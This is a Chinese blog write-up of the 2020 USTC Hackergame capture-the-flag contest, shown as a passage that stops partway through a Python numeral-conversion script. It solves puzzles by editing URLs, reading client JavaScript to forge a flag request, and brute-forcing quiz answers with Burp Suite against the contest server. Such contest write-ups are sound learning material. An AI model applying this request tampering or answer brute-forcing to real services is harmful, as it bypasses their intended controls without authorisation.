<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTF | 2020 USTC Hackergame WriteUp, MiaoTony">
    <meta name="description" content="一年一度的Hackergame又来了，题目很有梯度，很有脑洞，感觉不错，学到了许多，下次还来。">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>CTF | 2020 USTC Hackergame WriteUp | MiaoTony&#39;s小窝</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/favicon.ico">

    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/css/my.css">
	
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/jquery/jquery.min.js"></script>
    <script>
        //来个特效玩玩喵 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|ω·) 喵~快回来呀！';
                clearTimeout(titleTime);
            } else {
                document.title = '(/≧▽≦)/ Meow！';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 5.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="MiaoTony's小窝" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;s小窝</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友链</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;s小窝</div>
        <div class="logo-desc">
            
            喵~欢迎各位大佬的来访呀！
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友链
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/medias/featureimages/0.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTF | 2020 USTC Hackergame WriteUp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: auto;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/WriteUp/">
                                <span class="chip bg-color">WriteUp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-11-08
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    14.1k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    65 分
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一年一度的 USTC Hackergame 又来了。</p>
<blockquote>
<p><strong>中国科学技术大学第七届信息安全大赛</strong></p>
<p>比赛平台：<a target="_blank" rel="noopener" href="https://hack.lug.ustc.edu.cn/">https://hack.lug.ustc.edu.cn/</a></p>
<p>官方 WriteUp &amp; 题目存档：<a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2020-writeups">https://github.com/USTC-Hackergame/hackergame2020-writeups</a></p>
</blockquote>
<p>正好这周事情不是很多，有机会来打一打玩一玩。</p>
<p>由于怕比赛结束再写我会咕咕咕，于是就边做题边写 WriteUp 了。</p>
<p>比赛结束之后又复现了几道被卡住的题这样。</p>
<p><em>（这篇特别长特别长特别长……</em></p>
<hr>
<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>FLAG 提取器 还行。</p>
<p>（就是不想给你1个 flag 吧 233</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> prevVal <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#show"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'没想到吧!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1.00001</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>prevVal <span class="token operator">==</span> <span class="token number">1.00001</span><span class="token punctuation">)</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">0.99999</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>prevVal <span class="token operator">==</span> <span class="token number">0.99999</span><span class="token punctuation">)</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">1.00001</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#show"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        prevVal <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#number'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>直接改 url 就完事了。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161040769.png" alt="signin"></p>
<hr>
<h2 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答++"></a>猫咪问答++</h2><ol>
<li><p>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan  9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/docker.jpg" alt="docker"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/golang.sh-600x600.png" alt="golang"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/python.sh-600x600.png" alt="python"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/095048hc2bw28c2c3yy82n.jpg" alt="Plan9bunnysmblack"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/php-logo.jpeg" alt="php"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/9922720e0cf3d7caaa2f7a06f21fbe096a63a9e1" alt="GNU"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/perl.jpg" alt="perl"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/9e3df8dcd100baa1613b79b74a10b912c8fc2ea2" alt="PostgreSQL"></p>
<p><img src="/2020/11/08/CTF_2020Hackergame/0dd7912397dda1447af0caafb0b7d0a20cf48636" alt="MariaDB"></p>
<p>……</p>
<p><em>不找了（懒</em></p>
<p>最后直接穷举了，有 12 个。（详见后面）</p>
</li>
<li><p>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</p>
<p>这个题真的有意思。最开始还以为是很常见的 1500 bytes，或者 PPPOE 的1492bytes，但都不对。</p>
<p>于是真就去找了，没想到真有禽类作为标准这一说。</p>
<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BF%A1%E9%B8%BDIP%E9%80%9A%E8%AE%AF/7013924?fr=aladdin">百度百科：信鸽IP通讯</a></p>
<p><strong>“禽类作为载体传输IP数据包标准”</strong></p>
<p>详见 <a target="_blank" rel="noopener" href="http://www.faqs.org/rfcs/rfc1149.html">RFC 1149 - Standard for the transmission of IP datagrams on avia</a>。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101023000333.png" alt="MTU"></p>
<p>得到其 MTU 为 256 毫克。绝了！</p>
<blockquote>
<p>BTW, 顺便查到了 常见的 MTU 标准。</p>
<p>详见 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1191">RFC 1191: Path MTU Discovery</a>。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101023622367.png" alt="Common MTUs in the Internet"></p>
</blockquote>
</li>
<li><p>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</p>
<p><a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/wiki/lug/events/">https://lug.ustc.edu.cn/wiki/lug/events/</a></p>
<p><a target="_blank" rel="noopener" href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/slides/%E9%97%AA%E7%94%B5%E6%BC%94%E8%AE%B2/Teeworlds/teeworlds.pdf">https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/slides/%E9%97%AA%E7%94%B5%E6%BC%94%E8%AE%B2/Teeworlds/teeworlds.pdf</a></p>
<p>TEEWORLDS</p>
<p>9</p>
</li>
<li><p>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</p>
<p><a target="_blank" rel="noopener" href="https://map.baidu.com/poi/%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%A4%A7%E5%AD%A6(%E8%A5%BF%E6%A0%A1%E5%8C%BA)/@13053819.58,3720218.68,21z,87t,-84.8h?uid=f55a47578c94cfb15cd4fef9&amp;ugc_type=3&amp;ugc_ver=1&amp;device_ratio=2&amp;compat=1&amp;querytype=detailConInfo&amp;da_src=shareurl#panoid=09010500121705221534309496D&amp;panotype=street&amp;heading=336.61&amp;pitch=-19.46&amp;l=21&amp;tn=B_NORMAL_MAP&amp;sc=0&amp;newmap=1&amp;shareurl=1&amp;pid=09010500121705221534309496D">百度实景地图</a> 好啊！</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101020104659.png" alt="baidu map"></p>
<p>9</p>
</li>
<li><p>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</p>
<p>参考 <a target="_blank" rel="noopener" href="https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/">https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/</a></p>
<blockquote>
<p>经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag，其中约 57.44% 为正确的提交。</p>
</blockquote>
<p>17098 </p>
</li>
</ol>
<p>抓了个包拿去 Burp Suite 暴力解第一题答案<em>（大雾</em></p>
<p>最后得到 flag。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101023338503.png" alt="flag"></p>
<hr>
<h2 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h2><p>好一个翻版的2048，然而真正要到 2^14 才行（</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161235179.png"></p>
<p>玩了几局发现玩不下去了，直接看源码好了吧。</p>
<p>关键的源码在 <code>html_actuator.js</code> 最后这一段。</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">HTMLActuator</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">message</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">won</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> type    <span class="token operator">=</span> won <span class="token operator">?</span> <span class="token string">"game-won"</span> <span class="token operator">:</span> <span class="token string">"game-over"</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> message <span class="token operator">=</span> won <span class="token operator">?</span> <span class="token string">"FLXG 大成功！"</span> <span class="token operator">:</span> <span class="token string">"FLXG 永不放弃！"</span><span class="token punctuation">;</span>

    <span class="token keyword">var</span> url<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>won<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        url <span class="token operator">=</span> <span class="token string">"/getflxg?my_favorite_fruit="</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">+</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        url <span class="token operator">=</span> <span class="token string">"/getflxg?my_favorite_fruit="</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">let</span> request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    request<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>
    request<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'text'</span><span class="token punctuation">;</span>

    request<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"game-message-extra"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> request<span class="token punctuation">.</span>response<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<p>其中</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161459047.png" alt="banana"></p>
<p><code>NaN</code> 拼接可还行，JS 真奇妙。</p>
<p>于是构造请求 </p>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana">http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana</a></p>
<p>即可拿到 flag 了！</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161551356.png" alt="flag"></p>
<hr>
<h2 id="一闪而过的-Flag"><a href="#一闪而过的-Flag" class="headerlink" title="一闪而过的 Flag"></a>一闪而过的 Flag</h2><p>在命令行里打开就完事了。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161713760.png" alt="flag"></p>
<hr>
<h2 id="从零开始的记账工具人"><a href="#从零开始的记账工具人" class="headerlink" title="从零开始的记账工具人"></a>从零开始的记账工具人</h2><blockquote>
<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>
<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>
<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>
<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>
</blockquote>
<p>发现是个 excel。</p>
<p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161905992.png" alt="excel"></p>
<p>总共有1000行数据，本来想在里面直接转换的，但试了一下发现没找到自带的工具，于是用 Python 写个脚本算算好了。</p>
<p>首先用正则匹配先把元、角、分给提取出来，然后写个字典转换就好了。</p>
<p>这里的转换参考了 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/tanrong/p/10434172.html">Python 中文(大写)数字转阿拉伯数字</a>，在此基础上结合这题改了改代码。</p>
<p>另外考虑到浮点运算可能带来的精度问题，元、角、分单独统计，最后进行合并。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token triple-quoted-string string">"""
Hackergame 2020
从零开始的记账工具人

@Author: MiaoTony
@Time: 20201031
"""</span>

<span class="token comment"># constants for chinese_to_arabic</span>
CN_NUM <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'〇'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'一'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'二'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'三'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'四'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'五'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'六'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'七'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'八'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span 